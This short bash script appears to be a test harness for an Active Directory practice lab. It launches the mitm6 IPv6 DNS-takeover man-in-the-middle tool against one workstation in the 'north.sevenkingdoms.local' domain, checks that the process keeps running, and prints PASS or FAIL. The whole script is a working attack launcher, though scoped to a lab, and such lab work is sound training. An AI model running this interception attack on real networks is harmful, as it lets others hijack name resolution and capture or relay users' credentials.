#!/usr/bin/env bash
set -euo pipefail

IFACE="${IFACE:-vmnet10}"
DOMAIN="${DOMAIN:-north.sevenkingdoms.local}"
VICTIM="${VICTIM:-ws01.north.sevenkingdoms.local}"
LOG="${LOG:-/tmp/kingdoms-mitm6.log}"

EXISTING="$(pgrep -af '(^|[ /])mitm6([ ]|$)' || true)"
[[ -z "$EXISTING" ]] || {
  echo "FAIL: mitm6 is already running"
  echo "$EXISTING"
  exit 1
}

rm -f "$LOG"
sudo stdbuf -oL -eL mitm6 -i "$IFACE" -d "$DOMAIN" -hw "$VICTIM" >"$LOG" 2>&1 &
sleep 3

pgrep -af '(^|[ /])mitm6([ ]|$)' || {
  echo "FAIL: mitm6 did not remain running"
  cat "$LOG"
  exit 1
}

echo "PASS: mitm6 running, scoped to $VICTIM on $IFACE"
